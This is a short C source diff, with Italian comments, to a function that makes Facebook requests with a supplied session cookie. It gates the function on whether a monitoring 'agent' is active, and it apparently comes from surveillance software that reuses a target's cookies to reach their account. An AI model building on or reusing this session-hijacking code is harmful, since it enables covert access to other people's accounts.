@@ -17,6 +17,8 @@
 #define MAX_FACEBOOK_ACCOUNTS 500 
 #define FB_INVALID_TSTAMP 0xFFFFFFFF
 
+extern BOOL bPM_IMStarted; // variabili per vedere se gli agenti interessati sono attivi
+
 typedef struct {
 	char user[48];
 	DWORD tstamp;
@@ -101,9 +103,8 @@ DWORD HandleFaceBook(char *cookie)
 
 	CheckProcessStatus();
 
-	// XXX
-	// if (!AgentIM)
-	//	return SOCIAL_REQUEST_NETWORK_PROBLEM;
+	if (!bPM_IMStarted)
+		return SOCIAL_REQUEST_NETWORK_PROBLEM;
 	
 	// Identifica l'utente
 	ret_val = HttpSocialRequest(L"www.facebook.com", L"GET", L"/home.php?", 80, NULL, 0, &r_buffer, &response_len, cookie);	
